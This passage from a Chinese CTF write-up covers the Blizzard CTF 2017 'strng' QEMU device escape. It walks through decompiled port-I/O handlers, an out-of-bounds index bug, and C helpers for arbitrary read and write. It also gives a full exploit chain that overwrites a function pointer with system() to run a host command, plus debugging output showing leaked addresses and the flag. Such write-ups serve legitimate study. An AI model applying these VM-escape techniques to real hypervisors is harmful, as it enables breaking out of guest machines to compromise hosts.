        return *((uint32_t*)(mmio_mem + addr));
    }
    int main(int argc, char *argv[])
    {
        // Open and map I/O memory for the strng device
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
        if (mmio_fd == -1)
            die("mmio_fd open failed");
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (mmio_mem == MAP_FAILED)
            die("mmap mmio_mem failed");
    }
### PMIO
通过前面的分析我们知道`strng`有八个端口，端口起始地址为`0xc050`，相应的通过`strng_pmio_read`和`strng_pmio_write`去读写。
#### strng_pmio_read
    uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
    {
      uint64_t result; // rax
      uint32_t reg_addr; // edx
      result = -1LL;
      if ( size == 4 )
      {
        if ( addr )
        {
          if ( addr == 4 )
          {
            reg_addr = opaque->addr;
            if ( !(reg_addr & 3) )
              result = opaque->regs[reg_addr >> 2];
          }
        }
        else
        {
          result = opaque->addr;
        }
      }
      return result;
    }
当端口地址为0时直接返回`opaque->addr`，否则将`opaque->addr`右移两位作为索引`i`，返回`regs[i]`的值，比较关注的是这个`opaque->addr`在哪里赋值，它在下面的`strng_pmio_write`中被赋值。
#### strng_pmio_write
    void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      uint32_t reg_addr; // eax
      __int64 idx; // rax
      unsigned __int64 v6; // [rsp+8h] [rbp-10h]
      v6 = __readfsqword(0x28u);
      if ( size == 4 )
      {
        if ( addr )
        {
          if ( addr == 4 )
          {
            reg_addr = opaque->addr;
            if ( !(reg_addr & 3) )
            {
              idx = reg_addr >> 2;
              if ( (_DWORD)idx == 1 )
              {
                opaque->regs[1] = opaque->rand(opaque, 4LL, val);
              }
              else if ( (unsigned int)idx srand((unsigned int)val);
              }
              else if ( (_DWORD)idx == 3 )
              {
                opaque->regs[3] = opaque->rand_r(&opaque->regs[2], 4LL, val);
              }
              else
              {
                opaque->regs[idx] = val;
              }
            }
          }
        }
        else
        {
          opaque->addr = val;
        }
      }
    }
当`size`等于4时，以传入的端口地址为判断提供4个功能：
  * 当端口地址为0时，直接将传入的`val`赋值给`opaque->addr`。
  * 当端口地址不为0时，将`opaque->addr`右移两位得到索引`i`，分为三个功能：
    * `i`为0时，执行`srand`，返回值不存储。
    * `i`为1时，执行`rand`并将返回结果存储到`regs[1]`中。
    * `i`为3时，调用`rand_r`并将`regs[2]`作为第一个参数，返回值存储到`regs[3]`中。
    * 否则直接将`val`存储到`regs[idx]`中。
可以看到PMIO与MMIO的区别在于索引`regs`数组时，PMIO并不是由直接传入的端口地址`addr`去索引的；而是由`opaque->addr`去索引，而`opaque->addr`的赋值是我们可控的（端口地址为0时，直接将传入的`val`赋值给`opaque->addr`）。因此`regs`数组的索引可以为任意值，即可以越界读写。
越界读则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后再调用`pmio_read`去越界读。
越界写则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后仍然通过`pmio_write`去越界写。
#### 编程访问PMIO
[UAFIO](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)描述说有三种方式访问PMIO，这里仍给出一个比较便捷的方法去访问，即通过`IN`以及
`OUT`指令去访问。可以使用`IN`和`OUT`去读写相应字节的1、2、4字节数据（outb/inb, outw/inw,
outl/inl），函数的头文件为``，函数的具体用法可以使用`man`手册查看。
还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于`0x000-0x3ff`之间的端口，使用`ioperm(from, num,
turn_on)`即可；对于`0x3ff`以上的端口，则该调用执行`iopl(3)`函数去允许访问所有的端口（可使用`man ioperm` 和`man
iopl`去查看函数）。
典型代码如下：
    uint32_t pmio_base=0xc050;
    uint32_t pmio_write(uint32_t addr, uint32_t value)
    {
        outl(value,addr);
    }
    uint32_t pmio_read(uint32_t addr)
    {
        return (uint32_t)inl(addr);
    }
    int main(int argc, char *argv[])
    {
        // Open and map I/O memory for the strng device
        if (iopl(3) !=0 )
            die("I/O permission is not enough");
            pmio_write(pmio_base+0,0);
        pmio_write(pmio_base+4,1);
    }
## 利用
首先是利用pmio来进行任意读写。
  * 越界读：首先使用`strng_pmio_write`设置`opaque->addr`，即当`addr`为0时，传入的`val`会直接赋值给`opaque->addr`；然后再调用`strng_pmio_read`，就会去读`regs[val>>2]`的值，实现越界读，代码如下：
        uint32_t pmio_arbread(uint32_t offset)
    {
        pmio_write(pmio_base+0,offset);
        return pmio_read(pmio_base+4);
    }
  * 越界写：仍然是首先使用`strng_pmio_write`设置`opaque->addr`，即当`addr`为0时，传入的`val`会直接赋值给`opaque->addr`；然后调用`strng_pmio_write`，并设置`addr`为4，即会去将此次传入的`val`写入到`regs[val>>2]`中，实现越界写，代码如下：
        void pmio_abwrite(uint32_t offset, uint32_t value)
    {
        pmio_write(pmio_base+0,offset);
        pmio_write(pmio_base+4,value);
    }
完整的利用过程为：
  1. 使用`strng_mmio_write`将`cat /root/flag`写入到`regs[2]`开始的内存处，用于后续作为参数。
  2. 使用越界读漏洞，读取`regs`数组后面的`srand`地址，根据偏移计算出`system`地址。
  3. 使用越界写漏洞，覆盖`regs`数组后面的`rand_r`地址，将其覆盖为`system`地址。
  4. 最后使用`strng_mmio_write`触发执行`opaque->rand_r(&opaque->regs[2])`函数，从而实现`system("cat /root/flag")`的调用，拿到flag。
### 调试
将完整流程描述了一遍以后，再说下怎么调试。
`sudo ./launsh.sh`将虚拟机跑起来以后，在本地将[exp](https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c)用命令`make`编译通过，`makefile`内容比较简单：
    ALL:
            cc -m32 -O0 -static -o exp exp.c
然后使用命令`scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu`将exp拷贝到虚拟机中。
若要调试qemu以查看相应的流程，可以使用`ps -ax|grep qemu`找到相应的进程；再`sudo gdb -attach
[pid]`上去，然后在里面下断点查看想观察的数据，示例如下：
    b *strng_pmio_write
    b *strng_pmio_read
    b *strng_mmio_write
    b *strng_pmio_read
然后再`sudo ./exp`执行exp，就可以愉快的调试了。
一个小trick，可以使用`print`加上结构体可以很方便的查看数据（如果有符号的话）：
    pwndbg> print *(STRNGState*)$rdi
    $1 = {
      pdev = {
        qdev = {
          parent_obj = {
            class = 0x55de43a3f2e0,
            free = 0x7fc137fedba0 ,
            properties = 0x55de45283c00,
            ref = 0x13,
    ...
    pwndbg> print ((STRNGState*)$rdi).regs
    $3 = {0x0, 0x0, 0x1e28b6de, 0x6f6f722f, 0x6c662f74, 0x6761, 0x0 }
最后可以看到成功的拿到了宿主机下面的flag：
    leaking srandom addr: 0x7fc137211bb0
    libc base: 0x7fc1371ce000
    system addr: 0x7fc13721d440
    leaking heap addr: 0x55de43b35ef0
    parameter addr: 0x55de43b6fb6c
    flag{welcome_to_the_qeme_world}
## 小结
学到了很多的东西，也看到了很多的东西要学。
相关文件和脚本[链接](https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/BlizzardCTF2017-Strng)
## 参考链接
  1. [Blizzard CTF 2017: Sombra True Random Number Generator (STRNG)](https://github.com/rcvalle/blizzardctf2017)
  2. [BlizzardCTF 2017 - Strng](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)
  3. [Blizzard CTF 2017 Strng](https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/)